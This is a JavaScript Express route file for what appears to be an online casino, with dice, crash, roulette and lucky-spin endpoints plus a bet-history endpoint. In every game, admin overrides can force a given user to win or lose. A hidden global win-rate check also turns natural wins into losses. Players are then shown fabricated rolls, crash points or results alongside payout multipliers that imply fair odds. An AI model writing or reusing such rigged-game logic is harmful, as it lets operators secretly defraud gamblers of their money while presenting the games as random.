const express = require('express');
const { User, Transaction } = require('../config/store');
const { v4: uuidv4 } = require('uuid');
const { checkAndQualifyReferral } = require('../utils/referralQualification');
const { getUserOverride, getWinRate } = require('./admin');

const router = express.Router();

async function deductBet(user, bet) {
  if (user.balance < bet) throw new Error('Insufficient balance');
  user.balance = parseFloat((user.balance - bet).toFixed(8));
}

function applyWin(user, payout) {
  user.balance = parseFloat((user.balance + payout).toFixed(8));
}

async function recordTx(username, type, bet, payout, balanceAfter, meta = {}) {
  const tx = new Transaction({ id: uuidv4(), username, type, bet, payout, profit: payout - bet, balanceAfter, timestamp: new Date() });
  await tx.save();
  await checkAndQualifyReferral(username, bet);
  return tx;
}

// Helper: should this player win based on global win rate?
function winRateAllows() {
  return Math.random() * 100 < getWinRate();
}

router.post('/dice', async (req, res) => {
  try {
    const { bet, target, over } = req.body;
    if (!bet || bet <= 0 || !target || target < 2 || target > 98) return res.status(400).json({ error: 'Invalid bet or target (2-98)' });
    const user = await User.findOne({ username: req.user.username });
    await deductBet(user, parseFloat(bet));

    // Check override first, then win rate
    const override = getUserOverride(req.user.username, 'dice');
    let roll, win;
    if (override === 'win') {
      // Force win: pick a roll that wins
      roll = over ? parseFloat((target + Math.random() * (98 - target)).toFixed(2)) : parseFloat((Math.random() * target).toFixed(2));
      win = true;
    } else if (override === 'lose') {
      // Force lose: pick a roll that loses
      roll = over ? parseFloat((Math.random() * target).toFixed(2)) : parseFloat((target + Math.random() * (98 - target)).toFixed(2));
      win = false;
    } else {
      roll = parseFloat((Math.random() * 100).toFixed(2));
      const naturalWin = over ? roll > target : roll < target;
      // Apply win rate: if natural win but win rate says lose, force lose
      win = naturalWin && winRateAllows();
      if (!naturalWin && !winRateAllows()) win = false;
      else if (naturalWin) win = winRateAllows();
      else win = false;
    }

    const chance = over ? (100 - target) / 100 : target / 100;
    const multiplier = parseFloat((0.99 / chance).toFixed(4));
    const payout = win ? parseFloat((bet * multiplier).toFixed(8)) : 0;
    if (win) applyWin(user, payout);
    await user.save();
    const tx = await recordTx(req.user.username, 'dice', parseFloat(bet), payout, user.balance, { roll, target, over, multiplier });
    res.json({ roll, win, payout, multiplier, balance: user.balance, transaction: tx });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

router.post('/crash/start', async (req, res) => {
  try {
    const { bet, autoCashout } = req.body;
    if (!bet || bet <= 0) return res.status(400).json({ error: 'Invalid bet' });
    const user = await User.findOne({ username: req.user.username });
    await deductBet(user, parseFloat(bet));

    const override = getUserOverride(req.user.username, 'crash');
    let crashAt, win, cashedOutAt, payout;

    if (override === 'win') {
      crashAt = autoCashout ? parseFloat(autoCashout) + 1 : 10;
      cashedOutAt = autoCashout ? parseFloat(autoCashout) : 2;
      win = true;
    } else if (override === 'lose') {
      crashAt = 1.00;
      cashedOutAt = null;
      win = false;
    } else {
      const r = Math.random();
      crashAt = r < 0.01 ? 1.00 : parseFloat(Math.max(1, (0.99 / r)).toFixed(2));
      cashedOutAt = autoCashout && autoCashout <= crashAt ? parseFloat(autoCashout) : null;
      const naturalWin = cashedOutAt !== null;
      // Apply win rate
      win = naturalWin && winRateAllows();
      if (!win) cashedOutAt = null;
    }

    payout = win ? parseFloat((bet * (cashedOutAt || 1)).toFixed(8)) : 0;
    if (win) applyWin(user, payout);
    await user.save();
    const tx = await recordTx(req.user.username, 'crash', parseFloat(bet), payout, user.balance, { crashAt, cashedOutAt });
    res.json({ crashAt, cashedOutAt, win, payout, balance: user.balance, transaction: tx });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

router.post('/roulette', async (req, res) => {
  try {
    const { bet, betType } = req.body;
    if (!bet || bet <= 0 || betType === undefined) return res.status(400).json({ error: 'Invalid bet or betType' });
    const user = await User.findOne({ username: req.user.username });
    await deductBet(user, parseFloat(bet));

    const override = getUserOverride(req.user.username, 'roulette');
    const redNumbers = [1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36];
    let result, color, win, multiplier;

    if (override === 'win') {
      // Pick a result that matches the betType
      if (betType === 'red') { result = redNumbers[Math.floor(Math.random() * redNumbers.length)]; color = 'red'; }
      else if (betType === 'black') { const blacks = [2,4,6,8,10,11,13,15,17,20,22,24,26,28,29,31,33,35]; result = blacks[Math.floor(Math.random() * blacks.length)]; color = 'black'; }
      else if (betType === 'green') { result = 0; color = 'green'; }
      else { result = parseInt(betType); color = result === 0 ? 'green' : redNumbers.includes(result) ? 'red' : 'black'; }
      win = true;
    } else if (override === 'lose') {
      result = betType === 'red' ? 2 : betType === 'black' ? 1 : betType === 'green' ? 1 : (parseInt(betType) + 1) % 37;
      color = result === 0 ? 'green' : redNumbers.includes(result) ? 'red' : 'black';
      win = false;
    } else {
      result = Math.floor(Math.random() * 37);
      color = result === 0 ? 'green' : redNumbers.includes(result) ? 'red' : 'black';
      let naturalWin = false;
      if (betType === 'red' || betType === 'black') naturalWin = color === betType;
      else if (betType === 'green') naturalWin = color === 'green';
      else naturalWin = parseInt(betType) === result;
      // Apply win rate
      win = naturalWin && winRateAllows();
    }

    if (betType === 'red' || betType === 'black') multiplier = 2;
    else if (betType === 'green') multiplier = 14;
    else multiplier = 36;

    const payout = win ? parseFloat((bet * multiplier).toFixed(8)) : 0;
    if (win) applyWin(user, payout);
    await user.save();
    const tx = await recordTx(req.user.username, 'roulette', parseFloat(bet), payout, user.balance, { result, color, betType, multiplier });
    res.json({ result, color, win, payout, multiplier, balance: user.balance, transaction: tx });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

const SPIN_SEGMENTS = [
  { label: '0x', multiplier: 0, weight: 30 },
  { label: '0.5x', multiplier: 0.5, weight: 25 },
  { label: '1.5x', multiplier: 1.5, weight: 20 },
  { label: '2x', multiplier: 2, weight: 13 },
  { label: '3x', multiplier: 3, weight: 7 },
  { label: '5x', multiplier: 5, weight: 4 },
  { label: '10x', multiplier: 10, weight: 1 },
];

router.post('/luckyspin', async (req, res) => {
  try {
    const { bet } = req.body;
    if (!bet || bet <= 0) return res.status(400).json({ error: 'Invalid bet' });
    const user = await User.findOne({ username: req.user.username });
    await deductBet(user, parseFloat(bet));

    const override = getUserOverride(req.user.username, 'luckyspin');
    let segment;

    if (override === 'win') {
      // Pick a winning segment (multiplier > 1)
      const winSegments = SPIN_SEGMENTS.filter(s => s.multiplier > 1);
      segment = winSegments[Math.floor(Math.random() * winSegments.length)];
    } else if (override === 'lose') {
      segment = SPIN_SEGMENTS[0]; // 0x
    } else {
      const totalWeight = SPIN_SEGMENTS.reduce((s, seg) => s + seg.weight, 0);
      let rand = Math.random() * totalWeight;
      segment = SPIN_SEGMENTS[0];
      for (const seg of SPIN_SEGMENTS) { rand -= seg.weight; if (rand <= 0) { segment = seg; break; } }
      // Apply win rate: if player landed on a winning segment, check win rate
      if (segment.multiplier > 1 && !winRateAllows()) {
        segment = SPIN_SEGMENTS[0]; // force 0x
      }
    }

    const payout = parseFloat((bet * segment.multiplier).toFixed(8));
    if (payout > 0) applyWin(user, payout);
    await user.save();
    const tx = await recordTx(req.user.username, 'luckyspin', parseFloat(bet), payout, user.balance, { segment: segment.label, multiplier: segment.multiplier });
    res.json({ segment: segment.label, multiplier: segment.multiplier, payout, win: payout > 0, balance: user.balance, transaction: tx });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

router.get('/history', async (req, res) => {
  try {
    const history = await Transaction.find({ username: req.user.username, type: { $in: ['dice','crash','roulette','luckyspin'] } }).sort({ timestamp: -1 }).limit(50);
    res.json({ history });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

module.exports = router;
